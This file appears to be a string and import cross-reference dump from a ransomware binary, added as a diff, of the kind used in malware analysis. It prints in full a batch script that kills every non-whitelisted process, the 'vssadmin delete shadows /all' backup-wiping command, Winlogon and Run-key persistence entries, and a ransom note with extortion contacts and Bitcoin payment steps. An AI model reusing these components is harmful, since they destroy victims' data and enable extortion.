@@ -1,0 +1,152 @@
+reference_vaddr	symbol_addr	symbol_type	caller_function	data
+0x40101b	0x40d0d5	string	0x401000	ComSpec
+0x401076	0x40d153	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe: \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
+0x401087	0x40d153	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe: \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
+0x4010fc	0x40d0ad	string	0x4010b8	ReadMe.TxT
+0x401132	0x40caaa	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
+0x401143	0x40caaa	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
+0x40144d	0x40d0c5	string	0x4013df	windows
+0x40150b	0x40d0ad	string	0x4013df	ReadMe.TxT
+0x4016ff	0x40ca9b	string	0x40160d	.lock
+0x401754	0x401760	string	0x401718	YXI}ÍE blocks=Basic Latin,Latin-1 Supplement
+0x401756	0x40c8b5	string	0x401718	\r\nthread realtime error
+0x401787	0x40c8b5	string	0x401718	\r\nthread realtime error
+0x40190f	0x40c8e4	string	0x4018d1	\r\nsocket error
+0x401931	0x40c914	string	0x4018d1	\r\nconnect error
+0x4019a4	0x40c8f3	string	0x4018d1	\r\ndownload error
+0x4019ff	0x40c904	string	0x4018d1	\r\nchksumm error
+0x401a18	0x40c8a3	string	0x4018d1	\r\ndownload key ok
+0x401b57	0x40d69a	string	0x401b51	c:\Windows\bfsvcm.exe
+0x401b6c	0x40d5ca	string	0x401b51	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+0x401b7b	0x40d6b0	string	0x401b51	C:\Windows\system32\userinit.exe,
+0x401b86	0x40d6b0	string	0x401b51	C:\Windows\system32\userinit.exe,
+0x401b8f	0x40d690	string	0x401b51	Userinit
+0x401bbf	0x40d0d5	string	0x401b51	ComSpec
+0x401bc9	0x40d0dd	string	0x401b51	/c del "
+0x401be6	0x40d0e6	string	0x401b51	" >> NUL
+0x401c22	0x401c8d	string	0x401c0f	3*_^ZYX
+0x401c85	0x401c8d	string	0x401c0f	3*_^ZYX
+0x401cca	0x40d0d5	string	0x401c99	ComSpec
+0x401cde	0x40d0ef	string	0x401c99	vssadmin delete shadows /all
+0x401d02	0x40d5ca	string	0x401c99	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+0x401d30	0x40d688	string	0x401c99	Hacked
+0x401da9	0x40d688	string	0x401c99	Hacked
+0x401dbf	0x40caaa	string	0x401c99	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
+0x401dc9	0x40caaa	string	0x401c99	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
+0x401ddb	0x40c96b	string	0x401c99	ID: SfplHinIptOwnboa
+0x401df0	0x40d600	string	0x401c99	Software\Microsoft\Windows NT\CurrentVersion
+0x401e1e	0x40d664	string	0x401c99	ProductName
+0x401e34	0x40d670	string	0x401c99	Windows version unknown
+0x401ef6	0x40d770	string	0x401c99	Attention!!! Your files are encrypted !!!
+0x401f01	0x40d770	string	0x401c99	Attention!!! Your files are encrypted !!!
+0x401f0a	0x40d734	string	0x401c99	LegalNoticeCaption
+0x401f20	0x40d79a	string	0x401c99	To recover files, follow the prompts in the text file "Readme"
+0x401f2b	0x40d79a	string	0x401c99	To recover files, follow the prompts in the text file "Readme"
+0x401f34	0x40d760	string	0x401c99	LegalNoticeText
+0x401f47	0x40d6d3	string	0x401c99	C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
+0x401f52	0x40d6d3	string	0x401c99	C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
+0x401f5b	0x40d690	string	0x401c99	Userinit
+0x401f81	0x40d62d	string	0x401c99	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
+0x401f96	0x40d70c	string	0x401c99	"c:\Windows\notepad.exe" c:\ReadMe.TxT
+0x401fa1	0x40d70c	string	0x401c99	"c:\Windows\notepad.exe" c:\ReadMe.TxT
+0x401faa	0x40d65c	string	0x401c99	unlock
+0x401fbb	0x40c8cd	string	0x401c99	\r\nrun as administrator
+0x401ffe	0x40d69a	string	0x401fd9	c:\Windows\bfsvcm.exe
+0x40200e	0x40d69a	string	0x401fd9	c:\Windows\bfsvcm.exe
+0x40211b	0x40c943	string	0x4020d0	memory error\r\n
+0x40212e	0x40c934	string	0x4020d0	privelege no\r\n
+0x402143	0x40c924	string	0x4020d0	privelege yes\r\n
+0x4021ae	0x40c952	string	0x4020d0	\r\n : usb
+0x402201	0x40c804	string	0x4020d0	files\r\n skip files\r\n files/s\r\n s\r\n treads\r\nnetwork \r\n
+0x402353	0x40c804	string	0x402329	files\r\n skip files\r\n files/s\r\n s\r\n treads\r\nnetwork \r\n
+0x40236a	0x4030f4	import	0x40236a	user32.dll.DialogBoxParamA
+0x402370	0x4030ec	import	0x402370	user32.dll.EndDialog
+0x402376	0x4030e8	import	0x402376	user32.dll.GetDlgItem
+0x40237c	0x4030f8	import	0x40237c	user32.dll.SendMessageA
+0x402382	0x4030e4	import	0x402382	user32.dll.SetTimer
+0x402388	0x4030f0	import	0x402388	user32.dll.ShowWindow
+0x40238e	0x403030	import	0x40238e	kernel32.dll.CloseHandle
+0x402394	0x403020	import	0x402394	kernel32.dll.CopyFileA
+0x40239a	0x403024	import	0x40239a	kernel32.dll.CreateFileA
+0x4023a0	0x403028	import	0x4023a0	kernel32.dll.CreateFileMappingA
+0x4023a6	0x40302c	import	0x4023a6	kernel32.dll.CreateFileW
+0x4023ac	0x403048	import	0x4023ac	kernel32.dll.CreateThread
+0x4023b2	0x403034	import	0x4023b2	kernel32.dll.DeleteFileA
+0x4023b8	0x403038	import	0x4023b8	kernel32.dll.ExitProcess
+0x4023be	0x40303c	import	0x4023be	kernel32.dll.FindClose
+0x4023c4	0x403040	import	0x4023c4	kernel32.dll.FindFirstFileW
+0x4023ca	0x403044	import	0x4023ca	kernel32.dll.FindNextFileW
+0x4023d0	0x403090	import	0x4023d0	kernel32.dll.GetCurrentProcessId
+0x4023d6	0x40304c	import	0x4023d6	kernel32.dll.GetEnvironmentVariableA
+0x4023dc	0x403050	import	0x4023dc	kernel32.dll.GetFileAttributesW
+0x4023e2	0x403054	import	0x4023e2	kernel32.dll.GetLogicalDrives
+0x4023e8	0x403058	import	0x4023e8	kernel32.dll.GetModuleFileNameA
+0x4023ee	0x40305c	import	0x4023ee	kernel32.dll.GetModuleHandleA
+0x4023f4	0x403060	import	0x4023f4	kernel32.dll.GetTickCount
+0x4023fa	0x403064	import	0x4023fa	kernel32.dll.GlobalAlloc
+0x402400	0x403068	import	0x402400	kernel32.dll.GlobalFree
+0x402406	0x40306c	import	0x402406	kernel32.dll.MapViewOfFile
+0x40240c	0x403070	import	0x40240c	kernel32.dll.MoveFileW
+0x402412	0x403074	import	0x402412	kernel32.dll.MultiByteToWideChar
+0x402418	0x403078	import	0x402418	kernel32.dll.RtlMoveMemory
+0x40241e	0x40307c	import	0x40241e	kernel32.dll.SetErrorMode
+0x402424	0x403080	import	0x402424	kernel32.dll.SetFileAttributesW
+0x40242a	0x403084	import	0x40242a	kernel32.dll.SetThreadPriority
+0x402430	0x403088	import	0x402430	kernel32.dll.Sleep
+0x402436	0x40308c	import	0x402436	kernel32.dll.UnmapViewOfFile
+0x40243c	0x4030bc	import	0x40243c	kernel32.dll.VirtualAlloc
+0x402442	0x403094	import	0x402442	kernel32.dll.WriteFile
+0x402448	0x403098	import	0x402448	kernel32.dll.lstrcatA
+0x40244e	0x40309c	import	0x40244e	kernel32.dll.lstrcatW
+0x402454	0x4030a0	import	0x402454	kernel32.dll.lstrcmpW
+0x40245a	0x4030a4	import	0x40245a	kernel32.dll.lstrcmpiA
+0x402460	0x4030a8	import	0x402460	kernel32.dll.lstrcmpiW
+0x402466	0x4030ac	import	0x402466	kernel32.dll.lstrcpyA
+0x40246c	0x4030b0	import	0x40246c	kernel32.dll.lstrcpyW
+0x402472	0x4030b4	import	0x402472	kernel32.dll.lstrlenA
+0x402478	0x4030b8	import	0x402478	kernel32.dll.lstrlenW
+0x40247e	0x4030d4	import	0x40247e	shell32.dll.ShellExecuteA
+0x402484	0x403000	import	0x402484	advapi32.dll.GetUserNameA
+0x40248a	0x403004	import	0x40248a	advapi32.dll.RegCloseKey
+0x402490	0x403008	import	0x402490	advapi32.dll.RegOpenKeyExA
+0x402496	0x403010	import	0x402496	advapi32.dll.RegQueryValueExA
+0x40249c	0x40300c	import	0x40249c	advapi32.dll.RegSetValueExA
+0x4024a2	0x4030dc	import	0x4024a2	shlwapi.dll.PathRemoveFileSpecA
+0x4024a8	0x403018	import	0x4024a8	comctl32.dll.InitCommonControls
+0x4024ae	0x4030c4	import	0x4024ae	mpr.dll.WNetCloseEnum
+0x4024b4	0x4030cc	import	0x4024b4	mpr.dll.WNetEnumResourceA
+0x4024ba	0x4030c8	import	0x4024ba	mpr.dll.WNetOpenEnumA
+0x4024c0	0x403118	import	0x4024c0	wsock32.dll.WSACleanup
+0x4024c6	0x403100	import	0x4024c6	wsock32.dll.WSAStartup
+0x4024cc	0x403104	import	0x4024cc	wsock32.dll.closesocket
+0x4024d2	0x403108	import	0x4024d2	wsock32.dll.connect
+0x4024d8	0x40310c	import	0x4024d8	wsock32.dll.recv
+0x4024de	0x403110	import	0x4024de	wsock32.dll.send
+0x4024e4	0x403114	import	0x4024e4	wsock32.dll.socket
+0x403074	0x403038	import	0x4024e4	kernel32.dll.ExitProcess
+0x4041cc	0x4041d0	string	0x40415b	Y[_^Ëȭ= blocks=Basic Latin,Latin-1 Supplement,Latin Extended-B
+0x40466d	0x40468c	string	0x404610	3ہCh blocks=Basic Latin,Arabic
+0x404674	0x40468c	string	0x404610	3ہCh blocks=Basic Latin,Arabic
+0x404714	0x404524	string	0x4046b4	@USVWATAVAWH
+0x405725	0x405743	string	0x40570a	YZAXAYAZA[
+0x405733	0x405743	string	0x40570a	YZAXAYAZA[
+0x405766	0x40570a	string	0x40574e	ASARAQAPRQ
+0x405771	0x40570a	string	0x40574e	ASARAQAPRQ
+0x40577c	0x40570a	string	0x40574e	ASARAQAPRQ
+0x405787	0x40570a	string	0x40574e	ASARAQAPRQ
+0x40579c	0x40570a	string	0x40574e	ASARAQAPRQ
+0x4057bd	0x4057c2	string	0x40574e	A\[^_Z
+0x4094e5	0x40954c	string	0x40850c	CreateFileA
+0x409531	0x40959c	string	0x40850c	KERNEL32.dll
+0x409580	0x4095c8	string	0x40850c	CreateMenu
+0x4096c9	0x40972c	string	0x40850c	RtlImageNtHeader
+0x40975d	0x4097c0	string	0x40850c	RpcStringFreeA
+0x409787	0x4097ee	string	0x40850c	memset
+0x40b5d1	0x407c8c	string	0x40b39a	\$(E3
+0x40b6b0	0x407c8c	string	0x40b39a	\$(E3
+0x40b711	0x407c8c	string	0x40b39a	\$(E3
+0x40b7d4	0x407c8c	string	0x40b39a	\$(E3
+0x40bb68	0x40bb59	string	0x40bb48	jzja
+0x40bc01	0x40bc05	string	0x40bb70	_^ZY[
+0x40bf28	0x40bfa8	string	0x40bd28	VirtualAlloc
+0x40c1a9	0x40c21a	string	0x40bd28	memset
